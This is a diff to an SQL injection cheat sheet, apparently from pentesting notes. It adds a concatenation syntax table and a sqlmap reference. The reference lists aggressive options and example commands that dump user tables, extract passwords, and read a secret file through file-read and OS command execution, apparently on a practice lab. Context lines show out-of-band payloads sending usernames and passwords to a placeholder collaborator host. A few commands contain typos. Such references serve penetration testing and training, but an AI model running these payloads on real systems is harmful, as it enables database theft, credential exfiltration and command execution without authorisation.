@@ -14,6 +14,7 @@
       - [TIME BASED](#time-based)
       - [BLIND BASED](#blind-based)
       - [OUT-OF-BAND](#out-of-band)
+      - [CONCAT STRINGS](#concat)
       - [BYPASSING-SQL-SINTAX](#bypassing-sql-sintax)
       - [WAF-AUTH-BYPASS](#waf-auth-bypass)
       - [SQL MAP](#sql-map)
@@ -159,6 +160,16 @@ SELECT LOAD_FILE('\\\\<COLLAB_DOMAIN>\\<FILENAME>');
 SELECT username, password INTO OUTFILE '\\\\<COLLAB_DOMAIN>\\<FILENAME>';
 ```
 
+#### CONCAT
+
+```sql
+'foo' || 'bar'      ->  Oracle     
+'foo' + 'bar'       -> Microsoft SQL Server   
+'foo' || 'bar'      -> PostgreSQL  
+'foo' 'bar'         ->  MySQL (espaces)  
+CONCAT('foo','bar') -> MySQL
+```
+
 #### BYPASSING-SQL-SINTAX
 
 ```sql
@@ -268,9 +279,39 @@ or 1=1/*
 
 #### SQL MAP
 
-```
-sqlmap -r <REQUEST-FROM-BURP>
+```bash
+## MOST IMPORTANT PARAMS
 
-sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
+--url="<URL>"
+-p="PARAM-VULN"
+--cookie=
+--level=5
+--risk=3
+--dbms=<DBM>
+--param-exclude='param1|param2|..'
+--batch
+--dump
+--threads
+--technique=(default BEUSTQ)
+--os
+-D <DB>
+-T <TABLE>
+-C <COLUMN>
+--sql-query="<QUERY>" 
+--purgue
+--tor
+--os-cmd
+--file-read
 
+# EXAMPLES
+
+sqlmap- --url=<URL> -cookie=<COOKIE> --level 5 --risk 3 -p <PARAM-VULN> --batch --threads 10 --dbms=<DB-TYPE> --sql-query="SELECT  password FROM <TABLE> where username=<USER>"
+sqlmap -r <REQUEST-FROM-BURP.txt> --level=5 --risk=3
+sqlmap -r req.txt --level=5 --risk=3 --dump -D public -T users 
+
+## READ SECRET
+
+sqlmap -u "<IP>/?category=Pets" -p category --file-read "/home/carlos/secret" -v 1
+sqlmap -u "<IP>/?category=Pets" -p category --os-cmd "cat /home/carlos/secret" -v 1
 ```
+
